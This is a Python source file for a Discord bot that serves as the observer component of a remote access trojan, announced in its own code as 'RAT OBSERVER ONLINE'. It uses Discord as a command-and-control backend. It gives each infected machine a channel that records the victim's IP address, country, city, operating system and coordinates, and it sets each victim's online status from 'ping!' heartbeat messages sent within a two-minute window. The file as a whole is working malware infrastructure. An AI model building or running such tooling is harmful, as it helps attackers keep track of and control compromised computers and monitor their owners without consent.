from asyncio import sleep
import os
import re
import json
from datetime import datetime, timedelta
import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv
import requests


load_dotenv()
__DISCORD_TARGETS_CHANNEL_ID                = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID")) # should be in int type!
__DISCORD_GUILD_ID                          = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
__DISCORD_OBSERVER_TOKEN                    = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
__OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES   = 2
bot = commands.Bot(command_prefix="~")


def __get_channel_by_id(channel_id):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    return discord.utils.get(guild.channels, id=channel_id)


def check_if_channel_exists(channel_id):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    channel = discord.utils.get(guild.channels, id=channel_id)

    if channel:
        return True
    return False


async def get_targets_data():
    targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
    return await targets_channel.history().flatten()


def check_if_ping_message(message, ping_message_syntax):
    return message.author.bot and message.content == ping_message_syntax


def get_target_message_by_target_uuid(targets_messages, target_uuid):
    for target_message in targets_messages:
        target_data = json.loads(target_message.content)

        if target_data['identifier'] == target_uuid:
            return target_message
    return None


async def __check_targets_status():
    ping_message_syntax = 'ping!'
    targets_messages = await get_targets_data()
    online = False

    for target_message in targets_messages:
        target_data = json.loads(target_message.content)

        # if a target channel doesn't exist, create one and set target online status to false
        # after that continue to next target
        if not check_if_channel_exists(target_data['channel_id']):
            await delete_old_target_message(target_data)
            await create_target_text_channel(target_data)
            continue

        # fetch target's channel messages and check if a ping was delivered
        # from target in the time defined in __OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES variable
        channel = await bot.fetch_channel(target_data['channel_id'])
        now = datetime.today().utcnow()
        new_time = now - timedelta(minutes=__OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES)
        messages = await channel.history(limit=100, after=new_time, oldest_first=False).flatten()

        for message in messages:
            if check_if_ping_message(message, ping_message_syntax):
                online = True
                break
        
        # set target's online status depending if the target pinged in the last
        # __OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES minutes
        target_message = get_target_message_by_target_uuid(targets_messages, target_data['identifier'])

        if target_message:
            json_content = json.loads(target_message.content)
            json_content['online'] = online
            await target_message.edit(content = json.dumps(json_content))

        online = False

async def delete_old_target_message(target_data):
    targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
    targets = await targets_channel.history().flatten()

    for target in targets:
        target_message_data = json.loads(target.content)

        if target_data['channel_id'] == target_message_data['channel_id']:
            await target.delete()


async def create_target_text_channel(target_data):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    target_channel = await guild.create_text_channel(target_data['identifier'], topic=f"IP: {target_data['metadata']['ip']} | COUTRY: {target_data['metadata']['country']} | CITY: {target_data['metadata']['city']} | OS: {target_data['metadata']['os']}")
    print(f"Created new channel: {target_channel}")


def main():
    @tasks.loop(count=1)
    async def wait_until_ready():
        await bot.wait_until_ready()
        print('RAT OBSERVER ONLINE!')
        check_targets_status.start()


    @tasks.loop(minutes=__OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES)
    async def check_targets_status():
        await __check_targets_status()


    @bot.event
    async def on_guild_channel_create(channel):
        targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
        
        # get target metadata to json
        tmp = re.split(r'\s+\|\s+', channel.topic)
        metadata_list = list(map(lambda content: re.sub(r'^.+\:\s+', '',content), tmp))

        await targets_channel.send(json.dumps({
            'identifier': channel.name,
            'channel_id': channel.id,
            'metadata': {
                'ip': metadata_list[0],
                'country': metadata_list[1],
                'city': metadata_list[2],
                'os': metadata_list[3],
                'country_code': metadata_list[4],
                'lat': metadata_list[5],
                'lon': metadata_list[6]
            },
            'online': True
        }))

    wait_until_ready.start()
    bot.run(__DISCORD_OBSERVER_TOKEN)


if __name__ == '__main__':
    main()